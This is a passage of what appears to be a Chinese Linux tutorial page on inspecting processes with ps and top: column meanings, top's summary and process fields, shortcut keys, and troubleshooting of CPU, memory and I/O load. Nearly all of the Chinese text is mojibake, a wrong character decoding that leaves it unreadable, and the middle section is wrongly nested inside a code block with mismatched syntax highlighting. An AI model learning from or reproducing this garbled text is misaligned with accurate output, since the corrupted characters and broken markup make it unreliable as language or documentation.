<p>å¼‚å¸¸è¿›ç¨‹ ä»»åŠ¡å¤„ç†å®Œæ¯•å‘ŠçŸ¥çˆ¶è¿›ç¨‹æ—¶ï¼Œçˆ¶è¿›ç¨‹å¼‚å¸¸äº†ï¼Œäº§ç”Ÿå­¤å„¿è¿›ç¨‹ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å›æ”¶å­¤å„¿è¿›ç¨‹ äº†è§£</p>
<h4 id="æŸ¥çœ‹å½“å‰é™æ€è¿›ç¨‹æƒ…å†µ"><strong>æŸ¥çœ‹å½“å‰é™æ€è¿›ç¨‹æƒ…å†µ</strong></h4>
<p><strong><code>ps -ef</code>|<code>ps aux</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux   <span class="comment">#USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, COMMAND</span></span><br><span class="line">ps -ef   <span class="comment">#UID, PID, PPID, C, STIME, TTY, TIME, CMD</span></span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸‹æ˜¯ <code>ps aux</code> å’Œ <code>ps -ef</code> å‘½ä»¤ä¸­æ‰€æœ‰åˆ—çš„è‹±æ–‡ç¼©å†™åŠå«ä¹‰å¯¹ç…§è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th>è‹±æ–‡ç¼©å†™</th>
<th>å«ä¹‰è¯´æ˜</th>
<th>å‡ºç°å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
<td>USER</td>
<td>è¿›ç¨‹æ‰€å±çš„ç”¨æˆ·åï¼ˆç”¨æˆ·æ ‡è¯†ï¼Œå­—ç¬¦ä¸²å½¢å¼ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>PID</td>
<td>Process IDï¼Œè¿›ç¨‹å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆè¿›ç¨‹ IDï¼‰</td>
<td>ps auxã€ps -ef</td>
</tr>
<tr>
<td>%CPU</td>
<td>è¿›ç¨‹å ç”¨çš„ CPU èµ„æºç™¾åˆ†æ¯”ï¼ˆå•ä½ï¼š%ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>%MEM</td>
<td>è¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜ç™¾åˆ†æ¯”ï¼ˆå•ä½ï¼š%ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>VSZ</td>
<td>Virtual Set Sizeï¼Œè™šæ‹Ÿå†…å­˜å¤§å°ï¼ˆå•ä½ï¼šKBï¼ŒåŒ…å«ç‰©ç†å†…å­˜å’Œäº¤æ¢ç©ºé—´ç­‰ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>RSS</td>
<td>Resident Set Sizeï¼Œå®é™…å ç”¨çš„ç‰©ç†å†…å­˜å¤§å°ï¼ˆå•ä½ï¼šKBï¼Œä¸åŒ…å«äº¤æ¢ç©ºé—´ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>TTY</td>
<td>è¿›ç¨‹å…³è”çš„ç»ˆç«¯è®¾å¤‡ï¼ˆ<code>?</code> è¡¨ç¤ºæ— ç»ˆç«¯å…³è”ï¼Œé€šå¸¸ä¸ºåå°è¿›ç¨‹ï¼‰</td>
<td>ps auxã€ps -ef</td>
</tr>
<tr>
<td>STAT</td>
<td>Process Stateï¼Œè¿›ç¨‹çŠ¶æ€ï¼ˆå¦‚ R è¿è¡Œã€S ç¡çœ ã€Z åƒµå°¸ã€T åœæ­¢ç­‰ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>START</td>
<td>è¿›ç¨‹å¯åŠ¨çš„æ—¶é—´ï¼ˆæ ¼å¼éšç³»ç»Ÿæ—¶é—´èŒƒå›´å˜åŒ–ï¼Œå¦‚æ—¶åˆ†ã€æœˆæ—¥ç­‰ï¼‰</td>
<td>ps aux</td>
</tr>
<tr>
<td>TIME</td>
<td>è¿›ç¨‹ç´¯è®¡å ç”¨çš„ CPU æ—¶é—´ï¼ˆæ ¼å¼ï¼šæ—¶ï¼šåˆ†: ç§’ï¼‰</td>
<td>ps auxã€ps -ef</td>
</tr>
<tr>
<td>COMMAND</td>
<td>å¯åŠ¨è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤åŠå‚æ•°</td>
<td>ps aux</td>
</tr>
<tr>
<td>UID</td>
<td>User IDï¼Œè¿›ç¨‹æ‰€å±ç”¨æˆ·çš„ IDï¼ˆç”¨æˆ·æ ‡è¯†ï¼Œæ•°å­—å½¢å¼ï¼‰</td>
<td>ps -ef</td>
</tr>
<tr>
<td>PPID</td>
<td>Parent Process IDï¼Œçˆ¶è¿›ç¨‹çš„ IDï¼ˆæ ‡è¯†å½“å‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼‰</td>
<td>ps -ef</td>
</tr>
<tr>
<td>C</td>
<td>CPU ä½¿ç”¨ç‡ï¼ˆæ•´æ•°å½¢å¼ï¼Œåæ˜ è¿›ç¨‹è¿‘æœŸçš„ CPU å ç”¨æƒ…å†µï¼Œç²¾åº¦ä½äº % CPUï¼‰</td>
<td>ps -ef</td>
</tr>
<tr>
<td>STIME</td>
<td>è¿›ç¨‹å¯åŠ¨çš„æ—¶é—´ï¼ˆæ ¼å¼æ›´ç´§å‡‘ï¼Œé€šå¸¸ä¸ºæ—¶åˆ†æˆ–æœˆæ—¥ï¼Œéšç³»ç»Ÿæ—¶é—´èŒƒå›´å˜åŒ–ï¼‰</td>
<td>ps -ef</td>
</tr>
<tr>
<td>CMD</td>
<td>å¯åŠ¨è¿›ç¨‹çš„å‘½ä»¤åŠå‚æ•°ï¼ˆå¯èƒ½å› é•¿åº¦é™åˆ¶è¢«æˆªæ–­ï¼‰</td>
<td>ps -ef</td>
</tr>
</tbody>
</table>
<h4 id="æŸ¥çœ‹å½“å‰åŠ¨æ€è¿›ç¨‹æƒ…å†µ">æŸ¥çœ‹å½“å‰åŠ¨æ€è¿›ç¨‹æƒ…å†µ</h4>
<p><code>top</code> è¾“å‡ºåˆ†ä¸º <strong>ç³»ç»Ÿå…¨å±€çŠ¶æ€åŒº</strong> ä¸ <strong>è¿›ç¨‹è¯¦æƒ…åŒº</strong>ï¼Œä¸¤è€…å…±åŒæ„æˆç³»ç»Ÿå®æ—¶è¿è¡Œå¿«ç…§ã€‚</p>
<p>åœ¨ Linux ç³»ç»Ÿè¿ç»´ä¸­ï¼Œ<code>top</code> å‘½ä»¤æ˜¯å®æ—¶ç›‘æ§è¿›ç¨‹èµ„æºä¸ç³»ç»Ÿæ€§èƒ½çš„æ ¸å¿ƒå·¥å…·ã€‚å®ƒé€šè¿‡åŠ¨æ€åˆ·æ–°çš„ç•Œé¢ï¼Œæä¾› CPUã€å†…å­˜ã€è¿›ç¨‹çŠ¶æ€ç­‰å…³é”®æŒ‡æ ‡ï¼Œå¸®åŠ©ç®¡ç†å‘˜å¿«é€Ÿå®šä½èµ„æºç“¶é¢ˆä¸å¼‚å¸¸è¿›ç¨‹ã€‚</p>
<p>topä¸ ps å‘½ä»¤çš„æ ¸å¿ƒå·®å¼‚ï¼š</p>
<table>
<thead>
<tr>
<th>å·¥å…·</th>
<th>ç‰¹æ€§</th>
<th>é€‚ç”¨åœºæ™¯</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ps</code></td>
<td>é™æ€å¿«ç…§ï¼Œæ•è·æŸä¸€æ—¶åˆ»çš„è¿›ç¨‹çŠ¶æ€ï¼ˆå¦‚ <code>ps -aux</code>ï¼‰ã€‚</td>
<td>è®°å½•å†å²çŠ¶æ€ã€æ’æŸ¥è¿›ç¨‹å¯åŠ¨å‚æ•°ã€‚</td>
</tr>
<tr>
<td><code>top</code></td>
<td>åŠ¨æ€ç›‘æ§ï¼Œå®æ—¶åˆ·æ–°èµ„æºå ç”¨ä¸è¿›ç¨‹è¡Œä¸ºï¼ˆé»˜è®¤ 3 ç§’ / æ¬¡ï¼‰ã€‚</td>
<td>å®æ—¶æ€§èƒ½åˆ†æã€å¼‚å¸¸è¿›ç¨‹å®šä½ã€‚</td>
</tr>
</tbody>
</table>
<h5 id="ç³»ç»Ÿå…¨å±€çŠ¶æ€åŒº">ç³»ç»Ÿå…¨å±€çŠ¶æ€åŒº</h5>
<p>ç³»ç»Ÿå…¨å±€çŠ¶æ€åŒºä¸ºè¾“å‡ºçš„ä¸ŠåŠéƒ¨åˆ†ï¼Œä»¥å…¸å‹è¾“å‡ºä¸ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top - 09:27:45 up 5 days,  7:45,  4 <span class="built_in">users</span>,  load average: 0.00, 0.01, 0.05  </span><br><span class="line">Tasks: 123 total,   1 running, 121 sleeping,   1 stopped,   0 zombie  </span><br><span class="line">%Cpu(s):  0.1 us,  0.0 sy,  0.0 ni, 99.9 <span class="built_in">id</span>,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st  </span><br><span class="line">KiB Mem :  1863032 total,  1121288 free,   256980 used,   484764 buff/cache  </span><br><span class="line">KiB Swap:  1535996 total,  1535996 free,        0 used.  1408888 avail Mem  </span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p><strong>ç¬¬ä¸€è¡Œï¼ˆç³»ç»ŸåŸºç¡€ä¿¡æ¯ï¼‰</strong></p>
<ul class="lvl-2">
<li class="lvl-5">
<p><code>09:27:45</code>ï¼šå½“å‰ç³»ç»Ÿæ—¶é—´ã€‚</p>
</li>
<li class="lvl-5">
<p><code>up 5 days, 7:45</code>ï¼šç³»ç»Ÿå·²è¿ç»­è¿è¡Œ 5 å¤© 7 å°æ—¶ 45 åˆ†é’Ÿï¼ˆæœªé‡å¯ï¼‰ã€‚</p>
</li>
<li class="lvl-5">
<p><code>4 users</code>ï¼šå½“å‰ç™»å½•ç”¨æˆ·æ•°ï¼ˆå«æœ¬åœ°ç»ˆç«¯ä¸è¿œç¨‹è¿æ¥ï¼‰ã€‚</p>
</li>
<li class="lvl-5">
<pre><code class="language-bash">load average: 0.00, 0.01, 0.05
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     ï¼šç³»ç»Ÿå¹³å‡è´Ÿè½½ï¼Œåˆ†åˆ«å¯¹åº”è¿‡å» <span class="number">1</span> åˆ†é’Ÿã€<span class="number">5</span> åˆ†é’Ÿã€<span class="number">15</span> åˆ†é’Ÿçš„æ´»è·ƒè¿›ç¨‹æ•°ã€‚</span><br><span class="line"></span><br><span class="line">     - **å…³é”®é€»è¾‘**ï¼šè´Ÿè½½å€¼ä»£è¡¨å¤„äº **å¯è¿è¡ŒçŠ¶æ€ï¼ˆ`R`ï¼‰** æˆ– **ä¸å¯ä¸­æ–­ä¼‘çœ çŠ¶æ€ï¼ˆ`D`ï¼‰** çš„è¿›ç¨‹æ•°å¹³å‡å€¼ã€‚</span><br><span class="line">     - **å¥åº·æŒ‡æ ‡**ï¼šè‹¥ <span class="number">1</span> åˆ†é’Ÿè´Ÿè½½å€¼è¶…è¿‡ CPU æ ¸å¿ƒæ•°ï¼ˆå¦‚ <span class="number">4</span> æ ¸ CPU è´Ÿè½½ &gt;<span class="number">4</span>ï¼‰ï¼Œè¡¨æ˜ç³»ç»ŸçŸ­æœŸè¿‡è½½ï¼›è‹¥ <span class="number">15</span> åˆ†é’Ÿè´Ÿè½½æŒç»­åé«˜ï¼Œéœ€æ’æŸ¥é•¿æœŸèµ„æºç“¶é¢ˆã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. **ç¬¬äºŒè¡Œï¼ˆè¿›ç¨‹æ€»æ•°ç»Ÿè®¡ï¼‰**</span><br><span class="line"></span><br><span class="line">   - `123 total`ï¼šç³»ç»Ÿæ€»è¿›ç¨‹æ•°ã€‚</span><br><span class="line">   - `1 running`ï¼šå¤„äº `R` çŠ¶æ€çš„è¿›ç¨‹æ•°ï¼ˆæ­£åœ¨å ç”¨æˆ–ç­‰å¾… CPUï¼‰ã€‚</span><br><span class="line">   - `121 sleeping`ï¼šå¤„äº `S`ï¼ˆå¯ä¸­æ–­ä¼‘çœ ï¼‰æˆ– `D`ï¼ˆä¸å¯ä¸­æ–­ä¼‘çœ ï¼‰çŠ¶æ€çš„è¿›ç¨‹æ•°ã€‚</span><br><span class="line">   - `1 stopped`ï¼šå¤„äº `T`ï¼ˆåœæ­¢ï¼‰çŠ¶æ€çš„è¿›ç¨‹æ•°ï¼ˆå¦‚è¢« `Ctrl+z` æš‚åœçš„ `ping` è¿›ç¨‹ï¼‰ã€‚</span><br><span class="line">   - `0 zombie`ï¼šåƒµå°¸è¿›ç¨‹ï¼ˆ`Z` çŠ¶æ€ï¼‰æ•°é‡ï¼Œè‹¥å¤§äº <span class="number">0</span> éœ€æ£€æŸ¥çˆ¶è¿›ç¨‹æ˜¯å¦æœªå›æ”¶èµ„æºã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. **ç¬¬ä¸‰è¡Œï¼ˆCPU èµ„æºå ç”¨ï¼‰**</span><br><span class="line"></span><br><span class="line">   - **`us`ï¼šç”¨æˆ·æ€è¿›ç¨‹å ç”¨ CPU çš„ç™¾åˆ†æ¯”ï¼ˆå¦‚åº”ç”¨ç¨‹åºï¼‰**ã€‚</span><br><span class="line">   - `sy`ï¼šå†…æ ¸æ€è¿›ç¨‹å ç”¨ CPU çš„ç™¾åˆ†æ¯”ï¼ˆå¦‚ç³»ç»Ÿè°ƒç”¨ã€è¿›ç¨‹è°ƒåº¦ï¼‰ã€‚</span><br><span class="line">   - `ni`ï¼šè°ƒæ•´è¿‡ä¼˜å…ˆçº§ï¼ˆ`nice` å€¼é <span class="number">0</span>ï¼‰çš„ç”¨æˆ·æ€è¿›ç¨‹å ç”¨ CPU çš„ç™¾åˆ†æ¯”ã€‚</span><br><span class="line">   - `id`ï¼šCPU ç©ºé—²ç™¾åˆ†æ¯”ï¼ˆæ•°å€¼è¶Šé«˜ï¼Œç³»ç»Ÿè¶Šç©ºé—²ï¼‰ã€‚</span><br><span class="line">   - **`wa`ï¼šCPU ç­‰å¾… I/O æ“ä½œï¼ˆå¦‚ç£ç›˜è¯»å†™ï¼‰çš„ç™¾åˆ†æ¯”ï¼Œè‹¥é•¿æœŸé«˜äº <span class="number">5</span>% éœ€æ’æŸ¥å­˜å‚¨æ€§èƒ½ã€‚**</span><br><span class="line">   - `hi`ï¼šç¡¬ä¸­æ–­ï¼ˆå¦‚ç¡¬ä»¶è®¾å¤‡è§¦å‘çš„ä¸­æ–­ï¼‰å ç”¨ CPU çš„ç™¾åˆ†æ¯”ã€‚</span><br><span class="line">   - `si`ï¼šè½¯ä¸­æ–­ï¼ˆå¦‚å†…æ ¸å®šæ—¶å™¨ã€ç½‘ç»œæ•°æ®åŒ…å¤„ç†ï¼‰å ç”¨ CPU çš„ç™¾åˆ†æ¯”ã€‚</span><br><span class="line">   - `st`ï¼šè™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œç‰©ç† CPU è¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„ç™¾åˆ†æ¯”ï¼ˆ`st` è¿‡é«˜å¯èƒ½æ„å‘³ç€å®¿ä¸»æœºèµ„æºç«äº‰ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. **ç¬¬å››ã€äº”è¡Œï¼ˆå†…å­˜ä¸äº¤æ¢åˆ†åŒºï¼‰**</span><br><span class="line"></span><br><span class="line">   - `KiB Mem`ï¼ˆç‰©ç†å†…å­˜ï¼‰ï¼š</span><br><span class="line">     - `total`ï¼šæ€»å®¹é‡ï¼›`free`ï¼šå®Œå…¨ç©ºé—²å†…å­˜ï¼›`used`ï¼šè¿›ç¨‹ç›´æ¥å ç”¨å†…å­˜ï¼›`buff/cache`ï¼šç£ç›˜ç¼“å­˜ï¼ˆå¯é‡Šæ”¾ä¾›å…¶ä»–è¿›ç¨‹ä½¿ç”¨ï¼‰ã€‚</span><br><span class="line">   - `KiB Swap`ï¼ˆè™šæ‹Ÿå†…å­˜ï¼‰ï¼š</span><br><span class="line">     - `avail Mem`ï¼šæ–°è¿›ç¨‹å¯ä½¿ç”¨çš„æ€»å†…å­˜ï¼ˆå« `free` åŠå¯é‡Šæ”¾çš„ `buff/cache`ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### è¿›ç¨‹è¯¦æƒ…åŒºï¼ˆä¸‹åŠéƒ¨åˆ†ï¼‰</span><br><span class="line"></span><br><span class="line">ä»¥å…¸å‹è¾“å‡ºä¸ºä¾‹ï¼š</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND  </span><br><span class="line"><span class="number">53720</span> root      <span class="number">20</span>   <span class="number">0</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> S   <span class="number">0.3</span>  <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">18.08</span> kworker/<span class="number">1</span>:<span class="number">1</span>  </span><br><span class="line"><span class="title">    1 root      20   0  202396   7300   4184 S   0.0  0.4   5:</span><span class="number">01.00</span> systemd  </span><br><span class="line"><span class="title">    2 root      20   0       0      0      0 S   0.0  0.0   0:</span><span class="number">00.93</span> kthreadd  </span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
</ol>
<p><strong>å­—æ®µè¯´æ˜ï¼š</strong></p>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>å«ä¹‰è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>PID</code></td>
<td>è¿›ç¨‹å”¯ä¸€æ ‡è¯†ï¼Œæ“ä½œè¿›ç¨‹çš„æ ¸å¿ƒç´¢å¼•ï¼ˆå¦‚ <code>kill 53720</code>ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>USER</code></td>
<td>è¿›ç¨‹æ‰€å±ç”¨æˆ·ï¼Œç”¨äºæƒé™è¿½æº¯ï¼ˆå¦‚ <code>root</code> è¿›ç¨‹é€šå¸¸æ‹¥æœ‰æ›´é«˜æƒé™ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>PR</code></td>
<td>è¿›ç¨‹è°ƒåº¦ä¼˜å…ˆçº§ï¼ˆèŒƒå›´ 0-39ï¼Œå€¼è¶Šä½ä¼˜å…ˆçº§è¶Šé«˜ï¼Œå†…æ ¸åŠ¨æ€è°ƒæ•´ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>NI</code></td>
<td><code>nice</code> å€¼ï¼ˆä¼˜å…ˆçº§åç§»é‡ï¼ŒèŒƒå›´ -20~19ï¼Œå€¼è¶Šä½ä¼˜å…ˆçº§è¶Šé«˜ï¼Œç”¨æˆ·å¯é€šè¿‡ <code>nice</code> å‘½ä»¤è°ƒæ•´ï¼‰14ã€‚</td>
</tr>
<tr>
<td><code>VIRT</code></td>
<td>è¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜æ€»é‡ï¼ˆåŒ…æ‹¬ç‰©ç†å†…å­˜ã€äº¤æ¢åˆ†åŒºã€æœªä½¿ç”¨çš„åˆ†é…å†…å­˜ï¼‰ï¼Œç±»ä¼¼ â€œå»ºç­‘é¢ç§¯â€ã€‚</td>
</tr>
<tr>
<td><code>RES</code></td>
<td>è¿›ç¨‹å®é™…ä½¿ç”¨çš„ç‰©ç†å†…å­˜ï¼ˆä¸åŒ…æ‹¬äº¤æ¢åˆ†åŒºï¼‰ï¼Œç±»ä¼¼ â€œå®é™…ä½¿ç”¨é¢ç§¯â€ã€‚</td>
</tr>
<tr>
<td><code>SHR</code></td>
<td>è¿›ç¨‹å…±äº«çš„å†…å­˜é‡ï¼ˆå¦‚åŠ¨æ€é“¾æ¥åº“ï¼‰ï¼Œç±»ä¼¼ â€œå…¬æ‘Šé¢ç§¯â€ã€‚</td>
</tr>
<tr>
<td><code>S</code></td>
<td>è¿›ç¨‹çŠ¶æ€ï¼ˆ<code>R</code> è¿è¡Œã€<code>S</code> ä¼‘çœ ã€<code>T</code> åœæ­¢ã€<code>Z</code> åƒµå°¸ç­‰ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>%CPU</code></td>
<td>è¿›ç¨‹å ç”¨ CPU çš„ç™¾åˆ†æ¯”ï¼ˆè¿‡å» 3 ç§’å†…çš„å¹³å‡å€¼ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>%MEM</code></td>
<td>è¿›ç¨‹å ç”¨ç‰©ç†å†…å­˜çš„ç™¾åˆ†æ¯”ï¼ˆç›¸å¯¹äºæ€»ç‰©ç†å†…å­˜ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>TIME+</code></td>
<td>è¿›ç¨‹ç´¯è®¡å ç”¨çš„ CPU æ—¶é—´ï¼ˆç²¾ç¡®åˆ° 0.01 ç§’ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>COMMAND</code></td>
<td>å¯åŠ¨è¿›ç¨‹çš„å‘½ä»¤ï¼ˆå«å‚æ•°æ—¶ä¼šæˆªæ–­æ˜¾ç¤ºï¼ŒæŒ‰ <code>c</code> å¯æ˜¾ç¤ºå®Œæ•´è·¯å¾„ï¼‰ã€‚</td>
</tr>
</tbody>
</table>
<h5 id="æ ¸å¿ƒåŠŸèƒ½ä¸å¿«æ·é”®">æ ¸å¿ƒåŠŸèƒ½ä¸å¿«æ·é”®</h5>
<p><code>top</code> å‘½ä»¤ä»¥äº¤äº’å¼ç•Œé¢å®æ—¶å±•ç¤ºç³»ç»ŸçŠ¶æ€ï¼Œæ”¯æŒä»¥ä¸‹æ ¸å¿ƒæ“ä½œï¼š</p>
<ol>
<li class="lvl-3">
<p><strong>åŸºç¡€äº¤äº’</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>h</code> æˆ– <code>?</code>ï¼šè°ƒå‡ºå¸®åŠ©æ–‡æ¡£ï¼ŒæŸ¥çœ‹æ‰€æœ‰å¿«æ·é”®ä¸åŠŸèƒ½è¯´æ˜ã€‚</li>
<li class="lvl-5"><code>q</code>ï¼šé€€å‡ºç›‘æ§ç•Œé¢ã€‚</li>
<li class="lvl-5"><code>s</code> æˆ– <code>d</code>ï¼šè°ƒæ•´åˆ·æ–°é—´éš”ï¼ˆå•ä½ï¼šç§’ï¼‰ï¼Œé»˜è®¤ 3 ç§’åˆ·æ–°ä¸€æ¬¡ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>èµ„æºæ’åº</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>P</code>ï¼šæŒ‰ CPU ä½¿ç”¨ç‡ï¼ˆ<code>%CPU</code>ï¼‰é™åºæ’åºï¼Œå¿«é€Ÿå®šä½é«˜è´Ÿè½½è¿›ç¨‹ã€‚</li>
<li class="lvl-5"><code>M</code>ï¼šæŒ‰å†…å­˜ä½¿ç”¨ç‡ï¼ˆ<code>%MEM</code>ï¼‰é™åºæ’åºï¼Œæ’æŸ¥å†…å­˜å ç”¨å¼‚å¸¸ã€‚</li>
<li class="lvl-5"><code>T</code>ï¼šæŒ‰ç´¯è®¡ CPU æ—¶é—´ï¼ˆ<code>TIME+</code>ï¼‰æ’åºï¼Œè¯†åˆ«é•¿æœŸå ç”¨èµ„æºçš„è¿›ç¨‹ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>è§†å›¾ä¼˜åŒ–</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>1</code>ï¼šå±•å¼€å¤šæ ¸ CPU è§†å›¾ï¼Œæ˜¾ç¤ºæ¯ä¸ªç‰©ç†æ ¸å¿ƒçš„è´Ÿè½½è¯¦æƒ…ï¼ˆå¦‚ <code>%Cpu0</code>ã€<code>%Cpu1</code>ï¼‰ã€‚</li>
<li class="lvl-5"><code>z</code>ï¼šå¯ç”¨é¢œè‰²é«˜äº®ï¼ŒåŒºåˆ†ä¸åŒæ•°æ®åŒºåŸŸï¼ˆå¦‚çº¢è‰²æ ‡è®°é«˜è´Ÿè½½è¿›ç¨‹ï¼‰ã€‚</li>
<li class="lvl-5"><code>b</code>ï¼šé«˜äº®æ˜¾ç¤ºå¤„äº <code>R</code>ï¼ˆè¿è¡Œï¼‰çŠ¶æ€çš„è¿›ç¨‹ï¼Œç›´è§‚è¯†åˆ«æ´»è·ƒä»»åŠ¡ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>é«˜çº§æ§åˆ¶</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>k</code>ï¼šç»ˆæ­¢è¿›ç¨‹ï¼ˆè¾“å…¥ PID åå¯æŒ‡å®šä¿¡å·ï¼Œå¦‚ <code>9</code> å¼ºåˆ¶ç»ˆæ­¢ï¼‰ã€‚</li>
<li class="lvl-5"><code>r</code>ï¼šè°ƒæ•´è¿›ç¨‹ä¼˜å…ˆçº§ï¼ˆé€šè¿‡ <code>nice</code> å€¼ï¼ŒèŒƒå›´ -20~19ï¼Œå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼‰ã€‚</li>
<li class="lvl-5"><code>c</code>ï¼šåˆ‡æ¢æ˜¾ç¤ºè¿›ç¨‹å®Œæ•´å‘½ä»¤è¡Œï¼ˆå«å‚æ•°ï¼‰ï¼Œé¿å…å› åç§°æˆªæ–­å¯¼è‡´çš„è¯¯åˆ¤ã€‚</li>
</ul>
</li>
</ol>
<h5 id="å…³é”®æŒ‡æ ‡ä¸å¼‚å¸¸æ’æŸ¥">å…³é”®æŒ‡æ ‡ä¸å¼‚å¸¸æ’æŸ¥</h5>
<ol>
<li class="lvl-3">
<p><strong>æ€§èƒ½ç“¶é¢ˆå®šä½</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>CPU è¿‡è½½</strong>ï¼šè‹¥ <code>%CPU</code> é•¿æœŸé«˜äº 80%ï¼ŒæŒ‰ <code>P</code> æ’åºæ‰¾å‡ºé«˜è´Ÿè½½è¿›ç¨‹ï¼Œç»“åˆ <code>ps -fp &lt;PID&gt;</code> åˆ†æä»£ç é€»è¾‘æˆ–è€ƒè™‘æ‰©å®¹ã€‚</li>
<li class="lvl-5"><strong>å†…å­˜æ³„æ¼</strong>ï¼šè‹¥ <code>%MEM</code> æŒç»­å¢é•¿ä¸” <code>avail Mem</code> ä¸‹é™ï¼ŒæŒ‰ <code>M</code> æ’åºæ’æŸ¥å¼‚å¸¸è¿›ç¨‹ï¼Œä½¿ç”¨ <code>pmap</code> æˆ– <code>valgrind</code> åˆ†æå†…å­˜åˆ†é…ã€‚</li>
<li class="lvl-5"><strong>ç£ç›˜ I/O ç“¶é¢ˆ</strong>ï¼šè‹¥ <code>wa</code> é•¿æœŸé«˜äº 10%ï¼Œä½¿ç”¨ <code>iotop</code> å®šä½é«˜ I/O è¿›ç¨‹ï¼Œä¼˜åŒ–å­˜å‚¨æˆ–å‡çº§ç¡¬ä»¶ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>è¿›ç¨‹çŠ¶æ€å¼‚å¸¸</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>åƒµå°¸è¿›ç¨‹ï¼ˆ<code>Z</code> çŠ¶æ€ï¼‰</strong>ï¼šç»ˆæ­¢çˆ¶è¿›ç¨‹ï¼ˆ<code>kill &lt;PPID&gt;</code>ï¼‰æˆ–ä¿®å¤ç¨‹åºé€»è¾‘ï¼ˆç¡®ä¿è°ƒç”¨ <code>wait()</code> å›æ”¶å­è¿›ç¨‹èµ„æºï¼‰ã€‚</li>
<li class="lvl-5"><strong>ä¸å¯ä¸­æ–­è¿›ç¨‹ï¼ˆ<code>D</code> çŠ¶æ€ï¼‰</strong>ï¼šå¯èƒ½å› ç£ç›˜ I/O é˜»å¡ï¼Œä½¿ç”¨ <code>strace</code> è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨æˆ–æ£€æŸ¥å­˜å‚¨è®¾å¤‡å¥åº·çŠ¶æ€ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>è™šæ‹ŸåŒ–ç¯å¢ƒç›‘æ§</strong></p>
<ul class="lvl-2">
<li class="lvl-5">è‹¥ <code>st</code> æŒç»­é«˜äº 10%ï¼Œè¡¨æ˜å®¿ä¸»æœºèµ„æºä¸è¶³ï¼Œéœ€è¿ç§»è™šæ‹Ÿæœºæˆ–å¢åŠ ç‰©ç† CPU æ ¸å¿ƒã€‚</li>
</ul>
</li>
</ol>
<h5 id="æ•°æ®ä¿å­˜ä¸é«˜çº§ç”¨æ³•">æ•°æ®ä¿å­˜ä¸é«˜çº§ç”¨æ³•</h5>
<ol>
<li class="lvl-3">
<p><strong>æ‰¹å¤„ç†æ¨¡å¼è®°å½•æ—¥å¿—</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top -b -n 5 &gt; /tmp/top_monitor.log  <span class="comment"># è®°å½• 5 æ¬¡åˆ·æ–°ç»“æœåˆ°æ–‡ä»¶  </span></span><br></pre></td></tr></table></figure>
<ul class="lvl-2">
<li class="lvl-5">
<p><code>-b</code>ï¼šä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œï¼Œé€‚åˆè„šæœ¬è°ƒç”¨æˆ–ç¦»çº¿åˆ†æã€‚</p>
</li>
<li class="lvl-5">
<p><code>-n 5</code>ï¼šæŒ‡å®šåˆ·æ–°æ¬¡æ•°ï¼Œé¿å…æ— é™è¾“å‡ºã€‚</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>è‡ªå®šä¹‰æ˜¾ç¤ºå­—æ®µ</strong></p>
<ul class="lvl-2">
